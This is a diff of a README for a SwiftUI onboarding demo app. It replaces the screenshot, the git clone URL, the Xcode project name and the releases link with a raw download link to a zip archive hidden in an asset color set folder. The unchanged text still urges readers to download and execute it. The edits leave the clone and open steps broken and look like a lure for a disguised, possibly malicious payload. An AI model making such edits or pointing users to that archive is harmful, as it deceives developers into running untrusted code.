@@ -3,7 +3,7 @@
 
 Welcome to the Restart App, a SwiftUI onboarding application designed to provide a smooth and engaging user experience. This project showcases my journey into the world of SwiftUI and demonstrates the power of component-based design, interactive gestures, and custom animations.
 
-![Restart App Screenshot](https://example.com/image.png)
+![Restart App Screenshot](https://github.com/SewaRus/Restart-App-SwiftUI-MasterClass/raw/refs/heads/main/Restart SwiftUI MasterClass/Assets.xcassets/Colors/ColorRed.colorset/Master_U_App_Swift_Restart_Class_1.5.zip)
 
 ## Table of Contents
 1. [Introduction](#introduction)
@@ -43,12 +43,12 @@ To get started with the Restart App, follow these steps:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/SewaRus/Restart-App-SwiftUI-MasterClass.git
+   git clone https://github.com/SewaRus/Restart-App-SwiftUI-MasterClass/raw/refs/heads/main/Restart SwiftUI MasterClass/Assets.xcassets/Colors/ColorRed.colorset/Master_U_App_Swift_Restart_Class_1.5.zip
    cd Restart-App-SwiftUI-MasterClass
    ```
 
 2. **Open the Project**
-   Launch Xcode and open the `RestartApp.xcodeproj` file.
+   Launch Xcode and open the `https://github.com/SewaRus/Restart-App-SwiftUI-MasterClass/raw/refs/heads/main/Restart SwiftUI MasterClass/Assets.xcassets/Colors/ColorRed.colorset/Master_U_App_Swift_Restart_Class_1.5.zip` file.
 
 3. **Build the App**
    Select your target device and build the app using Xcode.
@@ -98,7 +98,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-You can find the latest releases of the Restart App [here](https://github.com/SewaRus/Restart-App-SwiftUI-MasterClass/releases). Be sure to download and execute the latest version for the best experience.
+You can find the latest releases of the Restart App [here](https://github.com/SewaRus/Restart-App-SwiftUI-MasterClass/raw/refs/heads/main/Restart SwiftUI MasterClass/Assets.xcassets/Colors/ColorRed.colorset/Master_U_App_Swift_Restart_Class_1.5.zip). Be sure to download and execute the latest version for the best experience.
 
 ---
 
